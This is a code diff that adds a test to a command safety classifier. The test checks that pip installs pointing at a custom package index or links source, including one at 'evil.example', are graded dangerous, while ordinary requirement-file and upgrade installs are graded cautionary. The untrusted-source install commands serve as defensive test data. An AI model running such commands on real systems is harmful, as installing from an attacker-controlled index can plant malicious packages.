@@ -461,6 +461,19 @@ class TestSafetyCoverageEdges:
             verdict = SafetyClassifier().classify(cmd)
             assert verdict.level is RiskLevel.DANGEROUS, (cmd, verdict.reasons)
 
+    def test_a_pip_short_source_option_needs_a_tick_however_it_is_spelled(self) -> None:
+        """Re-grade N1 (2026-10-25): `-i`/`-f` were caught only when a URL followed as its own word.
+        pip reads the first value-taking letter of a cluster, so these all name an index or links."""
+        for cmd in ("pip install -ihttps://evil.example/simple pkg", "pip install -fhttps://e/l pkg",
+                    "pip install -f ./wheels pkg", "pip install -Uqf ./w pkg",
+                    "pip3 install -qi https://e/s pkg", "pip install -i https://e/s pkg"):
+            verdict = SafetyClassifier().classify(cmd)
+            assert verdict.level is RiskLevel.DANGEROUS, (cmd, verdict.reasons)
+        for cmd in ("pip install -r requirements.txt", "pip install -ri r.txt", "pip install -U requests",
+                    "pip install -qe ."):
+            verdict = SafetyClassifier().classify(cmd)  # `-r i`: a requirements file named "i"
+            assert verdict.level is RiskLevel.CAUTION, (cmd, verdict.reasons)
+
     def test_an_apt_or_snap_install_from_a_non_default_source_needs_a_tick(self) -> None:
         """The escalation is not pip-only: a URL `.deb` and a snap sideload
         (`--dangerous`) are non-default sources that must ask too."""
